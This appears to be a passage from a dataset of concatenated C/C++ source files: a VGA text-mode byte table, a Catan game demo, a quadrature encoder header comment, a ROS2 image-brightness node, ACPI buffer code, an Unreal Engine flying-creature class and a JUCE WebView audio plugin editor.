0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, //  . . . . . . . .\n  0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, //  . . . . . . . .\n  0x20, 0x0f, 0xb1, 0x3b, 0xb1, 0x3b, 0xb2, 0x3b, 0xb2, 0x3f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, //  ..;.;.;.? . . .\n  0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, //  . . . . . . . .\n  0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0xb1, 0x3b, 0xb1, 0x3b, 0xb2, 0x3b, //  . . . . ..;.;.;\n  0xb2, 0x3f, 0x20, 0x0f, 0x20, 0x0f, 0xdf, 0x03, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, // .? . ... . . . .\n  0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, //  . . . . . . . .\n  0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, //  . . . . . . . .\n  0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, //  . . . . . . . .\n  0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, //  . . . . . . . .\n  0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, //  . . . . . . . .\n  0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, //  . . . . . . . .\n  0x20, 0x0f, 0xb1, 0x3b, 0xb1, 0x3b, 0xb1, 0x3b, 0xb1, 0x3f, 0xdc, 0x0b, 0xdc, 0x03, 0xdc, 0x03, //  ..;.;.;.?......\n  0xdc, 0x03, 0xdc, 0x03, 0x20, 0x0f, 0x20, 0x0f, 0xdc, 0x08, 0xdc, 0x03, 0xdc, 0x03, 0xdc, 0x03, // .... . .........\n  0xdc, 0x03, 0xdc, 0x03, 0xdc, 0x03, 0xdc, 0x08, 0x20, 0x0f, 0xb1, 0x3b, 0xb1, 0x3b, 0xb1, 0x3b, // ........ ..;.;.;\n  0xb1, 0x3f, 0xb1, 0x3f, 0xb2, 0x0b, 0x20, 0x0f, 0x20, 0x0f, 0xdc, 0x03, 0xdc, 0x03, 0xdc, 0x03, // .?.?.. . .......\n  0x20, 0x0f, 0x20, 0x0f, 0xdc, 0x03, 0xdc, 0x03, 0xdc, 0x03, 0x20, 0x0f, 0x20, 0x01, 0x20, 0x0f, //  . ....... . . .\n  0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, //  . . . . . . . .\n  0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, //  . . . . . . . .\n  0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, //  . . . . . . . .\n  0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, //  . . . . . . . .\n  0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, //  . . . . . . . .\n  0x20, 0x0f, 0xb2, 0x3b, 0xb1, 0x3b, 0xb0, 0x3b, 0xb0, 0x3f, 0x20",
    "/**\n * Demo file for Ex3.\n *\n */\n#include <iostream>\n#include <stdexcept>\n#include <vector>\n#include \"catan.hpp\"\n#include \"player.hpp\"\n#include \"board.hpp\"\nusing namespace std;\nusing namespace ariel;\n\nint main()\n{\n    Player p1(\"Amit\");\n    Player p2(\"Yossi\");\n    Player p3(\"Dana\");\n    Catan catan(p1, p2, p3);\n    // Starting of the game. Every player places two settlements and two roads.\n    catan.ChooseStartingPlayer();   // should print the name of the starting player, assume it is Amit.\n    Board board = catan.getBoard(); // get the board of the game.\n    vector<string> places = {\"Forest\", \"Hills\"};\n    vector<int> placesNum = {5, 6};\n    p1.placeSettelemnt(places, placesNum, board);\n    p1.placeRoad(places, placesNum, board);\n    vector<string> places = {\"Agricultural Land\", \"Desert\"};\n    vector<int> placesNum = {3, 4};\n    p1.placeSettelemnt(places, placesNum, board);\n    p1.placeRoad(places, placesNum, board); // p1 chooses Forest, hills, Agricultural Land, Desert with numbers 5, 6, 3, 4.\n\n    vector<string> places = {\"Mountains\", \"Pasture Land\"};\n    vector<int> placesNum = {4, 9};\n    p2.placeSettelemnt(places, placesNum, board);\n    p2.placeRoad(places, placesNum, board);\n    try\n    {\n        p3.placeSettelemnt(places, placesNum, board); // p3 tries to place a settlement in the same location as p2.\n    }\n    catch (const std::exception &e)\n    {\n        cout << e.what() << endl;\n    }\n    vector<string> places = {\"Forest\", \"Pasture Land\"};\n    vector<int> placesNum = {5, 9};\n    p2.placeSettelemnt(places, placesNum, board);\n    p2.placeRoad(places, placesNum, board); // p2 chooses Mountains, Pasture Land, and Forest with numbers 4, 9, 5.\n\n    vector<string> places = {\"Mountains\", \"Pasture Land\"};\n    vector<int> placesNum = {3, 8};\n    p3.placeSettelemnt(places, placesNum, board);\n    p3.placeRoad(places, placesNum, board);\n    vector<string> places = {\"Agricultural Land\", \"Pasture Land\"};\n    vector<int> placesNum = {3, 9};\n    p3.placeSettelemnt(places, placesNum, board);\n    p3.placeRoad(places, placesNum, board); // p3 chooses Mountains, Pasture Land, Agricultural Land, Pasture Land with numbers 3, 8, 3, 9.\n\n    // p1 has wood,bricks, and wheat, p2 has wood, ore, and wool, p3 has ore, wool, wheat.\n    p1.rollDice();                                    // Lets say it's print 4. Then, p2 gets ore from the mountations.\n    p1.placeRoad({\"Forest\", \"Hills\"}, {5, 6}, board); // p1 continues to build a road.\n    p1.endTurn();                                     // p1 ends his turn.\n\n    p2.rollDice(); // Lets say it's print 9. Then, p3 gets wool from the Pasture Land, p2 gets wool from the Pasture Land.\n    p2.endTurn();  // p2 ends his turn.\n\n    p3.rollDice(); // Lets say it's print 3. Then, p3 gets wheat from the Agricultural Land and Ore from the Mountains, p1 gets wheat from the Agricultural Land.\n    p3.endTurn();  // p3 ends his turn.\n\n    try\n    {\n        p2.rollDice(); // p2 tries to roll the dice again, but it's not his turn.\n    }\n    catch (const std::exception &e)\n    {\n        cout << e.what() << endl;\n    }\n\n    p1.rollDice();                       // Lets say it's print 6. Then, p1 gets bricks from the hills.\n    p1.trade(p2, \"wood\", \"brick\", 1, 1); // p1 trades 1 wood for 1 brick with p2.\n    p1.endTurn();                        // p1 ends his turn.\n\n    p2.rollDice();           // Lets say it's print 9. Then, p3 gets wool from the Pasture Land, p2 gets wool from the Pasture Land.\n    p2.buyDevelopmentCard(); // p2 buys a development card. Lets say it is a bonus points card.\n    p2.endTurn();            // p2 ends his turn.\n\n    p1.printPoints(); // p1 has 2 points because it has two settelments.\n    p2.printPoints(); // p2 has 3 points because it has two settelments and a bonus points card.\n    p3.printPoints(); // p3 has 2 points because it has two settelments.\n\n    catan.printWinner(); // Should print None because no player reached 10 points.\n}",
    "/**\n * @author Aaron Berk\n *\n * @section LICENSE\n *\n * Copyright (c) 2010 ARM Limited\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * all copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n * THE SOFTWARE.\n *\n * @section DESCRIPTION\n *\n * Quadrature Encoder Interface.\n *\n * A quadrature encoder consists of two code tracks on a disc which are 90\n * degrees out of phase. It can be used to determine how far a wheel has\n * rotated, relative to a known starting position.\n *\n * Only one code track changes at a time leading to a more robust system than\n * a single track, because any jitter around any edge won't cause a state\n * change as the other track will remain constant.\n *\n * Encoders can be a homebrew affair, consisting of infrared emitters/receivers\n * and paper code tracks consisting of alternating black and white sections;\n * alternatively, complete disk and PCB emitter/receiver encoder systems can\n * be bought, but the interface, regardless of implementation is the same.\n *\n *               +-----+     +-----+     +-----+\n * Channel A     |  ^  |     |     |     |     |\n *            ---+  ^  +-----+     +-----+     +-----\n *               ^  ^\n *               ^  +-----+     +-----+     +-----+\n * Channel B     ^  |     |     |     |     |     |\n *            ------+     +-----+     +-----+     +-----\n *               ^  ^\n *               ^  ^\n *               90deg\n *\n * The interface uses X2 encoding by default which calculates the pulse count\n * based on reading the current state after each rising and falling edge of\n * channel A.\n *\n *               +-----+     +-----+     +-----+\n * Channel A     |     |     |     |     |     |\n *            ---+     +-----+     +-----+     +-----\n *               ^     ^     ^     ^     ^\n *               ^  +-----+  ^  +-----+  ^  +-----+\n * Channel B     ^  |  ^  |  ^  |  ^  |  ^  |     |\n *            ------+  ^  +-----+  ^  +-----+     +--\n *               ^     ^     ^     ^     ^\n *               ^     ^     ^     ^     ^\n * Pulse count 0 1     2     3     4     5  ...\n *\n * This interface can also use X4 encoding which calculates the pulse count\n * based on reading the current state after each rising and falling edge of\n * either channel.\n *\n *               +-----+     +-----+     +-----+\n * Channel A     |     |     |     |     |     |\n *            ---+     +-----+     +-----+     +-----\n *               ^     ^     ^     ^     ^\n *               ^  +-----+  ^  +-----+  ^  +-----+\n * Channel B     ^  |  ^  |  ^  |  ^  |  ^  |     |\n *            ------+  ^  +-----+  ^  +-----+     +--\n *               ^  ^  ^  ^  ^  ^  ^  ^  ^  ^\n *               ^  ^  ^  ^  ^  ^  ^  ^  ^  ^\n * Pulse count 0 1  2  3  4  5  6  7  8  9  ...\n *\n * It defaults\n *\n * An optional index channel can be used which determines when a full\n * revolution has occured.\n *\n * If a 4 pules per revolution encoder was used, with X4 encoding,\n * the following would be observed.\n *\n *               +-----+     +-----+     +-----+\n * Channel A     |     |     |     |     |     |\n *            ---+     +-----+     +-----+     +-----\n *               ^     ^     ^     ^     ^\n *               ^  +-----+  ^  +-----+  ^  +-----+\n * Channel B     ^  |  ^  |  ^  |  ^  |  ^  |     |\n *            ------+  ^  +-----+  ^  +-----+     +--\n *               ^  ^  ^  ^  ^  ^  ^  ^  ^  ^\n *               ^  ^  ^  ^  ^  ^  ^  ^  ^  ^\n *               ^  ^  ^  +--+  ^  ^  +--+  ^\n *               ^  ^  ^  |  |  ^  ^  |  |  ^\n * Index      ------------+  +--------+  +-----------\n *               ^  ^  ^  ^  ^  ^  ^  ^  ^  ^\n * Pulse count 0 1  2  3  4  5  6  7  8  9  ...\n * Rev.  count 0          1           2\n *\n * Rotational position in degrees can be calculated by:\n *\n * (pulse count / X * N) * 360\n *\n * Where X is the encoding type [e.g. X4 encoding => X=4], and N is the number\n * of pulses per revolution.\n *\n * Linear position can be calculated by:\n *\n * (pulse count / X * N) * (1 / PPI)\n *\n * Where X is encoding type [e.g. X4 encoding => X=44], N is the number of\n *",
    "// Build with: \n//    colcon build --packages-select brightness --symlink-install\n\n// Run with: \n//    ros2 launch brightness brightness.yaml \n\n#include <chrono>\n\n#include \"rclcpp/rclcpp.hpp\"\n#include \"sensor_msgs/msg/image.hpp\"\n#include \"std_msgs/msg/u_int8.hpp\"\n#include \"std_srvs/srv/empty.hpp\"\n#include \"std_srvs/srv/trigger.hpp\"\n\nusing namespace std::placeholders;\nusing namespace std::chrono_literals;\n\nclass MyNode : public rclcpp::Node\n{\npublic:\n   MyNode() : Node(\"my_node\")\n   {\n      // gets the timer_period_s parameter from the yaml file\n      declare_parameter(\"timer_period_s\", 5);\n      auto timer_period_s = std::chrono::seconds(get_parameter(\"timer_period_s\").as_int());\n      RCLCPP_INFO(get_logger(), \"Timer period: %ld\", timer_period_s.count());\n\n      // subscribes to the /image topic and calls the image_callback method which is defined below\n      subscriber_ = create_subscription<sensor_msgs::msg::Image>(\n         \"/image\", rclcpp::SensorDataQoS(), std::bind(&MyNode::image_callback, this, _1));\n      \n      // publishes the brightness value to the /brightness topic. This is to publish a message of type std_msgs::msg::UInt8\n      publisher_ = create_publisher<std_msgs::msg::UInt8>(\"/brightness\", rclcpp::SensorDataQoS());\n      \n      // creates a timer that calls the timer_callback method every timer_period_s seconds\n      timer_ = create_wall_timer(timer_period_s, std::bind(&MyNode::timer_callback, this));\n\n      // creates a client to call the /save service. This is called in the timer_callback method which then calls the service\n      // in the image_saver node to save the image (i.e. not in this node file)\n      client_ = create_client<std_srvs::srv::Empty>(\"/save\");\n\n      // creates a service to call the /image_counter service. This is triggered when the service is called by the client (i,e\n      // not in this node file - usage could be like 'ros2 service call /image_counter std_srvs/srv/Trigger {}' for example)\n      server_ = create_service<std_srvs::srv::Trigger>(\n         \"/image_counter\", std::bind(&MyNode::counter_callback, this, _1, _2));\n\n\n      RCLCPP_INFO(get_logger(), \"Node started!\");\n   }\n\nprivate:\n   void image_callback(const sensor_msgs::msg::Image::SharedPtr image)\n   {\n      long long sum = 0;\n      for (uint8_t value : image->data)\n      {\n         sum += value;\n      }\n      int avg = sum / image->data.size();\n      // RCLCPP_INFO(get_logger(), \"Brightness: %d\", avg);\n      \n      std_msgs::msg::UInt8 brightness_msg;\n      brightness_msg.data = avg;\n      publisher_->publish(brightness_msg);\n   }\n\n   void timer_callback()\n   {\n      RCLCPP_INFO(get_logger(), \"Timer activate\");\n\n      if (!client_->wait_for_service(1s))\n      {\n         RCLCPP_ERROR(get_logger(), \"Failed to connect to the image save service\");\n         return;\n      }\n\n      saved_imgs_++;\n      auto request = std::make_shared<std_srvs::srv::Empty::Request>();\n      auto future = client_->async_send_request(request);\n   }\n\n   void counter_callback(const std_srvs::srv::Trigger::Request::SharedPtr req,\n      const std_srvs::srv::Trigger::Response::SharedPtr res)\n   {\n      res->success = 1;\n      res->message = \"Saved images: \" + std::to_string(saved_imgs_);\n   }\n\n   uint saved_imgs_ = 0;\n   rclcpp::Subscription<sensor_msgs::msg::Image>::SharedPtr subscriber_;\n   rclcpp::Publisher<std_msgs::msg::UInt8>::SharedPtr publisher_;\n   rclcpp::TimerBase::SharedPtr timer_;\n   rclcpp::Client<std_srvs::srv::Empty>::SharedPtr client_;\n   rclcpp::Service<std_srvs::srv::Trigger>::SharedPtr server_;\n};\n\nint main(int argc, char **argv)\n{\n   rclcpp::init(argc, argv);\n   auto node = std::make_shared<MyNode>();\n   rclcpp::spin(node);\n   rclcpp::shutdown();\n   return 0;\n}",
    "#include \"qacpi/object.hpp\"\n\nnamespace qacpi {\n\tBuffer::Buffer(Buffer&& other) noexcept {\n\t\tdata = move(other.data);\n\t}\n\n\tbool Buffer::init(const void* new_data, uint32_t new_size) {\n\t\tif (!data) {\n\t\t\treturn false;\n\t\t}\n\n\t\tif (new_size) {\n\t\t\tauto* ptr = static_cast<uint8_t*>(qacpi_os_malloc(new_size));\n\t\t\tif (!ptr) {\n\t\t\t\treturn false;\n\t\t\t}\n\t\t\tmemcpy(ptr, new_data, new_size);\n\t\t\tdata->data = ptr;\n\t\t\tdata->size = new_size;\n\t\t}\n\t\treturn true;\n\t}\n\n\tbool Buffer::init_with_size(uint32_t new_size) {\n\t\tif (!data) {\n\t\t\treturn false;\n\t\t}\n\n\t\tif (new_size) {\n\t\t\tauto* ptr = static_cast<uint8_t*>(qacpi_os_malloc(new_size));\n\t\t\tif (!ptr) {\n\t\t\t\treturn false;\n\t\t\t}\n\t\t\tmemset(ptr, 0, new_size);\n\t\t\tdata->data = ptr;\n\t\t\tdata->size = new_size;\n\t\t}\n\t\treturn true;\n\t}\n\n\tbool Buffer::clone(const Buffer& other) {\n\t\treturn init(other.data->data, other.data->size);\n\t}\n\n\tBuffer::Data::~Data() {\n\t\tif (data) {\n\t\t\tqacpi_os_free(data, size);\n\t\t}\n\t}\n\n\tPackage::Package(Package&& other) noexcept {\n\t\tdata = move(other.data);\n\t}\n\n\tbool Package::init(uint32_t new_size) {\n\t\tif (!data) {\n\t\t\treturn false;\n\t\t}\n\n\t\tif (new_size) {\n\t\t\tauto* ptr = static_cast<ObjectRef*>(qacpi_os_malloc(new_size * sizeof(ObjectRef)));\n\t\t\tif (!ptr) {\n\t\t\t\treturn false;\n\t\t\t}\n\t\t\tfor (uint32_t i = 0; i < new_size; ++i) {\n\t\t\t\tconstruct<ObjectRef>(&ptr[i], ObjectRef::empty());\n\t\t\t}\n\t\t\tdata->elements = ptr;\n\t\t\tdata->element_count = new_size;\n\t\t}\n\t\treturn true;\n\t}\n\n\tbool Package::clone(const Package& other) {\n\t\tif (!data) {\n\t\t\treturn false;\n\t\t}\n\n\t\tif (other.data->element_count) {\n\t\t\tauto* ptr = static_cast<ObjectRef*>(qacpi_os_malloc(other.data->element_count * sizeof(ObjectRef)));\n\t\t\tif (!ptr) {\n\t\t\t\treturn false;\n\t\t\t}\n\t\t\tfor (uint32_t i = 0; i < other.data->element_count; ++i) {\n\t\t\t\tconstruct<ObjectRef>(&ptr[i], ObjectRef {});\n\t\t\t\tif (!ptr[i] || !other.data->elements[i]->data.clone(ptr[i]->data)) {\n\t\t\t\t\tfor (uint32_t j = 0; j <= i; ++j) {\n\t\t\t\t\t\tptr[j].~SharedPtr();\n\t\t\t\t\t}\n\t\t\t\t\tqacpi_os_free(ptr, other.data->element_count * sizeof(ObjectRef));\n\t\t\t\t\treturn false;\n\t\t\t\t}\n\t\t\t}\n\t\t\tdata->elements = ptr;\n\t\t\tdata->element_count = other.data->element_count;\n\t\t}\n\t\treturn true;\n\t}\n\n\tPackage::Data::~Data() {\n\t\tif (elements) {\n\t\t\tfor (uint32_t i = 0; i < element_count; ++i) {\n\t\t\t\telements[i].~SharedPtr();\n\t\t\t}\n\t\t\tqacpi_os_free(elements, element_count * sizeof(ObjectRef));\n\t\t}\n\t}\n}\n",
    "#include \"Pterodon.h\"\n#include \"PrimalPredators/Other/PterodonFootprintL.h\"\n#include \"PrimalPredators/Other/PterodonFootprintR.h\"\n#include \"Camera/CameraComponent.h\"\n#include \"Components/CapsuleComponent.h\"\n#include \"Components/SphereComponent.h\"\n#include \"Components/PrimitiveComponent.h\"\n#include \"GameFramework/CharacterMovementComponent.h\"\n#include \"GameFramework/SpringArmComponent.h\"\n#include \"Kismet/KismetSystemLibrary.h\"\n#include \"Net/UnrealNetwork.h\"\n\nAPterodon::APterodon(){\n\tPrimaryActorTick.bCanEverTick = false;\n\tconst static ConstructorHelpers::FObjectFinder<UAnimBlueprint> AnimClass(TEXT(\"/Game/Dinosaurs/Pterodon/Animations/BPA_Pterodon\"));\n\tconst static ConstructorHelpers::FObjectFinder<USkeletalMesh> PteraMesh(TEXT(\"/Game/Dinosaurs/Pterodon/Mesh/Ptero\"));\n\t\n\tGetMesh()->SetAnimClass(AnimClass.Object->GeneratedClass);\n\tGetMesh()->SetSkeletalMesh(PteraMesh.Object);\n\tGetMesh()->SetRelativeLocation(FVector(0.0f, 0.0f, -18.681961));\n\tGetMesh()->SetRelativeRotation(FRotator(0.0, -90.0, 0.0));\n\n\tCamera->SetRelativeRotation(FRotator(-10.0,0.0,0.0));\n\tCameraBoom->SetupAttachment(GetRootComponent());\n\tCameraBoom->SetRelativeLocation(FVector(0.0,0.0,284.610321));\n\tCameraBoom->TargetArmLength = 545.085876;\n\tCameraBoom->SocketOffset = FVector(0.0,0.0,152.157623);\n\n\tBodyHitSphere->SetupAttachment(GetMesh(), FName(\"c_back4\"));\n\tBodyHitSphere->SetSphereRadius(55.0);\n\tBodyHitSphere->bHiddenInGame = false;\n\n\tDecalFootRight->SetupAttachment(GetMesh(), FName(\"r_ankle\"));\n\tDecalFootLeft->SetupAttachment(GetMesh(), FName(\"l_ankle\"));\n\t\n\tPredatorRunSpeed = 190.f;\n\tPredatorWalkSpeed = 100.f;\n\tPredatorMaxFlySpeed = 6700.f;\n\tPredatorDefaultFlySpeed = 1000.f;\n\tPredatorGlideSpeed = 600.f;\n\n\tGetCharacterMovement()->MaxFlySpeed = PredatorDefaultFlySpeed;\n\tGetCharacterMovement()->MaxWalkSpeed = PredatorWalkSpeed;\n\tGetCapsuleComponent()->SetCapsuleHalfHeight(132);\n\tGetCapsuleComponent()->SetCapsuleRadius(132);\n\tGetCapsuleComponent()->bHiddenInGame = false;\n\tGetCapsuleComponent()->SetIsReplicated(true);\n}\n\nUClass* APterodon::GetPredatorClass(){\n\treturn this->StaticClass();\n}\n\nUClass* APterodon::GetRightFootprintClass() const{\n\treturn APterodonFootprintR::StaticClass();\n}\n\nUClass* APterodon::GetLeftFootprintClass() const{\n\treturn APterodonFootprintL::StaticClass();\n}\n\nvoid APterodon::BeginPlay(){\n\tSuper::BeginPlay();\n\tGetCapsuleComponent()->OnComponentHit.AddDynamic(this, &APterodon::CapsuleHitLand);\n\tMulticastSlopTimer();\n}\n\nvoid APterodon::Tick(float DeltaSeconds){\n\tSuper::Tick(DeltaSeconds);\n}\n\nvoid APterodon::SetupPlayerInputComponent(UInputComponent* PlayerInputComponent){\n\tSuper::SetupPlayerInputComponent(PlayerInputComponent);\n\tPlayerInputComponent->BindAction(\"Jump\",IE_Pressed,this,&APterodon::Jump);\n\tPlayerInputComponent->BindAction(\"Jump\",IE_Released,this,&APterodon::ServerFlyingUpFinished);\n\tPlayerInputComponent->BindAction(\"FlyingDown\",IE_Pressed,this,&APterodon::ServerFlyingDown);\n\tPlayerInputComponent->BindAction(\"FlyingDown\",IE_Released,this,&APterodon::ServerFlyingDownFinished);\n\tPlayerInputComponent->BindAction(\"LookAroundAir\", IE_Pressed, this, &APterodon::LookAroundAirPressed);\n\tPlayerInputComponent->BindAction(\"LookAroundAir\", IE_Released, this, &APterodon::LookAroundAirReleased);\n\tPlayerInputComponent->BindAction(\"AirBrake\", IE_Pressed, this, &APterodon::AirBrake);\n\tPlayerInputComponent->BindAction(\"AirBrake\", IE_Released, this, &APterodon::AirBrakeReleased);\n}\n\nvoid APterodon::TurnRl(const float Rate) {\n\tSuper::TurnRl(Rate);\n\tSmoothRotation();\n}\n\nbool APterodon::ServerPredatorRun_Validate(const float Speed){\n\treturn Speed >= PredatorWalkSpeed && Speed <= PredatorRunSpeed;\n}\n\nEPredatorType APterodon::GetPredatorType() const{\n\treturn EPredatorType::Pterodon;\n}\n\nfloat APterodon::GetDirectRotationInterp() const{\n\treturn 0.2f;\n}\n\nvoid APterodon::SmoothRotation(){\n\tif(!bIsDead){\n\t\tDirectionTrace(FVector(Camera->GetForwardVector().X, Camera->GetForwardVector().Y, 0.f), 2000, FColor::Red);\n\t\tDirectionTrace(FVector(GetActorForwardVector().X, GetActorForwardVector().Y, 0.f), 1000, FColor::Orange);\n\n\t\tFRotator TargetRotation;\n\t\tconst float MoveFB = GetInputAxisValue(\"MoveFB\");\n\t\tconst float MoveRL = GetInputAxisValue(\"MoveRL\");\n\t\t\n\t\tif(GetCharacterMovement()->MovementMode == MOVE_Flying)\n\t\t\tTargetRotation = DirectionModifier(MOVE_Flying);\n\t\telse\n\t\t\tTargetRotation = DirectionModifier(MOVE_Walking);\n\n\t\tif (!PredatorHasGrabbed())\n\t\t\tif (MoveFB > 0.f || MoveFB < 0.f || MoveRL > 0.f || MoveRL < 0.f || bIsGlide || bIsBrake) {\n\t\t\t\tconst FRotator DirectionRotation = FMath::RInterpTo(GetActorRotation(), TargetRotation, 0.107, GetDirectRotationInterp());\n\t\t\t\tif (HasAuthority())\n\t\t\t\t\tClientSmoothSetActorRotation(bIsLookAround && GetCharacterMovement()->IsFlying() ? GetActorRotation() : FRotator(DirectionRotation.Pitch, DirectionRotation.Yaw, DirectionRotation.Roll));\n\t\t\t\telse {\n\t\t\t\t\tClientSmoothSetActorRotation(bIsLookAround && GetCharacterMovement()->IsFlying() ? GetActorRotation() : FRotator(DirectionRotation.Pitch, DirectionRo",
    "#include \"PluginProcessor.h\"\r\n#include \"PluginEditor.h\"\r\n\r\n\r\n//==============================================================================\r\nAudioPluginAudioProcessorEditor::AudioPluginAudioProcessorEditor (AudioPluginAudioProcessor& p)\r\n    : AudioProcessorEditor (&p), processorRef (p)\r\n{\r\n    // Create some options to configure the webview\r\n    choc::ui::WebView::Options options;\r\n    options.enableDebugMode = true;\r\n    options.acceptsFirstMouseClick = true;\r\n\r\n    // Initialize the webview...\r\n    webView = std::make_unique<choc::ui::WebView>(options);\r\n\r\n    // Platform specific container initialization, then set our webview...\r\n#if JUCE_MAC\r\n    webViewContainer = std::make_unique<juce::NSViewComponent>();\r\n    webViewContainer->setView (webView->getViewHandle());\r\n#elif JUCE_WINDOWS\r\n    webViewContainer = std::make_unique<juce::HWNDComponent>();\r\n    webViewContainer->setHWND (webView->getViewHandle());\r\n#endif\r\n\r\n    addAndMakeVisible (*webViewContainer);\r\n\r\n    // If the user changes the gain value from the DAW, we need to pass the slider to the JS function receiveGainValue\r\n    auto receiveGainValue = [this](float newGainValue)\r\n    {\r\n        std::string jsCode = \"receiveGainValue(\" + std::to_string(newGainValue) + \");\";\r\n        webView->evaluateJavascript (jsCode, nullptr);\r\n    };\r\n\r\n    // Associate the GAIN parameter in the processor with the UI component we need to update when GAIN is changed (in JS)\r\n    gainAttachment = std::make_unique<juce::ParameterAttachment>(*processorRef.getParamList().getParameter (\"GAIN\"), receiveGainValue);\r\n\r\n    /* Lambda to parse through the JS JavaScript and pass it to the processor.\r\n    This is a \"proof of concept\" where the only param is our gain.  A true implementation would identify what param\r\n    was changed, then update accordingly.  I suppose you could alternatively have a separate callback for each param. */\r\n    auto onGainSliderChanged = [this](const choc::value::ValueView& args) ->choc::value::Value\r\n    {\r\n        auto json = juce::JSON::parse (choc::json::toString(args));\r\n\r\n        if (json.isArray())\r\n        {\r\n            float gainVal = json[0].toString().getFloatValue();\r\n            gainAttachment->setValueAsCompleteGesture (gainVal);\r\n        }\r\n        else\r\n        {\r\n            return choc::value::Value(-1);\r\n        }\r\n\r\n        return choc::value::Value(0);\r\n    };\r\n\r\n    /* Here, we are looking for a callback in our JS called gainValueCallback(). This is invoked on the web view's\r\n     * slider change.  Then we call our C++ lambda onGainSliderChanged() to pass on the gain value */\r\n    webView->bind (\"gainValueCallback\", onGainSliderChanged);\r\n\r\n    // Trickery to get the html file location from the current source tree\r\n    juce::File thisFilesPath{__FILE__};\r\n    auto pathToHtml = thisFilesPath.getParentDirectory().getParentDirectory().getChildFile(\"WebView/gain_view.html\");\r\n\r\n    if (pathToHtml.existsAsFile())\r\n    {\r\n        // we are on our developer machine and the source tree has the html\r\n        auto ssPath = R\"(file:///)\"+pathToHtml.getFullPathName().toStdString();\r\n\r\n        // navigate allows to refresh from the html at runtime\r\n        webView->navigate(ssPath);\r\n    } else\r\n    {\r\n        // developer source tree html was not found, revert to loading from plugin binary resource\r\n\r\n        // Find our html file from our binary data\r\n        const auto htmlData = juce::String::createStringFromData (data::gain_view_html, data::gain_view_htmlSize);\r\n\r\n        // If valid, show the HTML\r\n        if (htmlData.isNotEmpty())\r\n            webView->setHTML (htmlData.toStdString());\r\n        else\r\n            jassertfalse;\r\n    }\r\n    \r\n    setSize (400, 300);\r\n}\r\n\r\nAudioPluginAudioProcessorEditor::~AudioPluginAudioProcessorEditor()\r\n{\r\n}\r\n\r\n//==============================================================================\r\nvoid AudioPluginAudioProcessorEditor::paint (juce::Graphics& g)\r\n{\r\n    // (Our component is opaque, so we must completely fill the background with a solid colour)\r\n    g.fillAll (getLookAndFeel().findColour (juce::ResizableWindow::backgroundColourId));\r\n}\r\n\r\nvoid AudioPluginAudioProcessorEditor::resized()\r\n{\r\n    webViewContainer->setBounds (getLocalBounds());\r\n}\r\n",
